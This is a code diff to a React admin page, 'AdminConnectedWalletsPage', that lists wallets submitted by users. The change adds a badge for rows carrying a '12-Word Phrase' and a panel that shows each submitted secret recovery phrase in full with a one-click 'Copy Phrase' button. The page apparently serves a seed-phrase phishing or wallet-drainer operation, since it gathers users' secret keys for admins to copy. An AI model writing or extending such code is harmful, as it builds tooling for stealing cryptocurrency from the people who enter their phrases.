@@ -620,17 +620,24 @@ export default function AdminConnectedWalletsPage() {
                         </div>
                       </td>
 
-                      {/* Submitted Address */}
+                      {/* Submitted Address / Recovery Phrase */}
                       <td className="py-3.5 px-3">
-                        <button
-                          type="button"
-                          onClick={() => handleCopy(row.address, "Wallet Address")}
-                          className="font-mono text-[12px] text-gray-800 bg-gray-50 hover:bg-emerald-50 hover:text-emerald-700 border border-gray-200 px-2.5 py-1 rounded-lg inline-flex items-center gap-2 transition"
-                          title={`Click to copy: ${row.address}`}
-                        >
-                          <span>{shortenAddress(row.address)}</span>
-                          <Copy size={12} className="opacity-60 shrink-0" />
-                        </button>
+                        <div className="flex flex-col gap-1 items-start">
+                          <button
+                            type="button"
+                            onClick={() => handleCopy(row.address, "Wallet Address")}
+                            className="font-mono text-[12px] text-gray-800 bg-gray-50 hover:bg-emerald-50 hover:text-emerald-700 border border-gray-200 px-2.5 py-1 rounded-lg inline-flex items-center gap-2 transition"
+                            title={`Click to copy: ${row.address}`}
+                          >
+                            <span>{shortenAddress(row.address)}</span>
+                            <Copy size={12} className="opacity-60 shrink-0" />
+                          </button>
+                          {row.seedPhrase && (
+                            <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded text-[10px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200">
+                              <ShieldCheck size={10} /> 12-Word Phrase
+                            </span>
+                          )}
+                        </div>
                       </td>
 
                       {/* Reason & Origin */}
@@ -844,22 +851,43 @@ export default function AdminConnectedWalletsPage() {
               </Link>
             </div>
 
-            {/* Submitted Wallet Address / Recovery Phrase */}
+            {/* Submitted Recovery Phrase (if provided) */}
+            {selectedRow.seedPhrase && (
+              <div className="mb-4">
+                <div className="flex items-center justify-between mb-1.5">
+                  <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-600 flex items-center gap-1">
+                    <ShieldCheck size={13} /> Secret Recovery Phrase (12 Words)
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() => handleCopy(selectedRow.seedPhrase!, "Recovery Phrase")}
+                    className="text-xs font-bold text-emerald-600 hover:underline inline-flex items-center gap-1"
+                  >
+                    <Copy size={12} /> Copy Phrase
+                  </button>
+                </div>
+                <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/30 text-emerald-300 font-mono text-xs sm:text-sm break-all select-all leading-relaxed">
+                  {selectedRow.seedPhrase}
+                </div>
+              </div>
+            )}
+
+            {/* Public Wallet Address */}
             <div className="mb-5">
               <div className="flex items-center justify-between mb-1.5">
                 <span className="text-[11px] font-bold uppercase tracking-wider text-gray-500">
-                  {selectedRow.seedPhrase ? "Recovery Phrase / Seed Phrase" : "Submitted Wallet Address"}
+                  {selectedRow.seedPhrase ? "Derived Public Wallet Address" : "Submitted Wallet Address"}
                 </span>
                 <button
                   type="button"
-                  onClick={() => handleCopy(selectedRow.seedPhrase || selectedRow.address, selectedRow.seedPhrase ? "Recovery Phrase" : "Wallet Address")}
+                  onClick={() => handleCopy(selectedRow.address, "Wallet Address")}
                   className="text-xs font-bold text-emerald-600 hover:underline inline-flex items-center gap-1"
                 >
-                  <Copy size={12} /> Copy
+                  <Copy size={12} /> Copy Address
                 </button>
               </div>
-              <div className="p-3.5 rounded-xl bg-slate-900 text-emerald-300 font-mono text-xs sm:text-sm break-all select-all">
-                {selectedRow.seedPhrase || selectedRow.address}
+              <div className="p-3.5 rounded-xl bg-slate-900 text-gray-200 font-mono text-xs sm:text-sm break-all select-all">
+                {selectedRow.address}
               </div>
             </div>
 
